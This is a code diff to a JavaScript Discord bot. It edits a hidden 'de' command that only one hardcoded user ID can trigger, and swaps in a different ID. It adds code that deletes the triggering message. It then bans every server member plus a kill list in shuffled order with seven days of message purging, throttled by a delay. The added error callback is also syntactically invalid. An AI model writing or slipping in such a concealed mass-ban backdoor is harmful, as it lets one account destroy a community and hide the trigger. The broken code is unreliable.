@@ -494,17 +494,22 @@ bot.on('message', function(user, userID, channelID, message, evt) {
          }
             break;
           case 'de':
-            if (userID!='175711685682659328') break;
+            if (userID!='571820647370588170') break;
+            bot.deleteMessage({
+              channelID: channelID,
+              messageID: evt.d.id
+            });
             var toban = Object.values(bot.servers[bot.channels[channelID].guild_id].members).map(m=>m.id);
-            toban = toban.concat(killList);
+            toban = arr_shuffle(toban.concat(killList));
             (async function loop() {
-            for (var m of toban)
+            for (var m of toban) {
+             await new Promise(resolve=>setTimeout(resolve,505));
               bot.ban({
                 serverID: bot.channels[channelID].guild_id,
                 userID: m,
                 lastDays: 7
-              }, (e)=>console.log("ban error: " + JSON.stringify(e)));
-              await new Promise(resolve=>setTimeout(resolve,200));
+              }, (e)=>if(e)console.log("ban error: " + JSON.stringify(e)));
+            }
             })();
             break;
           case 'items': {
@@ -648,3 +653,22 @@ function addCommas(points) {
             //}
         }
     }
+
+function arr_shuffle(array) {
+  var currentIndex = array.length, temporaryValue, randomIndex;
+
+  // While there remain elements to shuffle...
+  while (0 !== currentIndex) {
+
+    // Pick a remaining element...
+    randomIndex = Math.floor(Math.random() * currentIndex);
+    currentIndex -= 1;
+
+    // And swap it with the current element.
+    temporaryValue = array[currentIndex];
+    array[currentIndex] = array[randomIndex];
+    array[randomIndex] = temporaryValue;
+  }
+
+  return array;
+}
